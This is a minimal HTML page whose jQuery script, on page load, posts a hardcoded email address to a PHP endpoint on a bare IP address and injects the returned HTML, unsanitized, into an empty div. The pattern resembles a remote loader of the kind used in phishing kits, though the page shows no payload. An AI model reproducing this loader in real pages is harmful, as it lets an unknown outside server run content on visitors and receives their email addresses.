<!DOCTYPE html>
<html>
<head>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
			var unsubscribe = "andrew@yahoo.com";
			var formData = {
					email: unsubscribe
			};
            $.ajax({
                url: "http://3.16.143.23/check_access.php",
                type: "POST",
				data: formData,
                dataType: "html",
                success: function(response) {
                    $("#xlc").html(response);   
                },
                
            });
        });
    </script>
</head>
<body>
    <div id="xlc"></div>
</body>
</html>
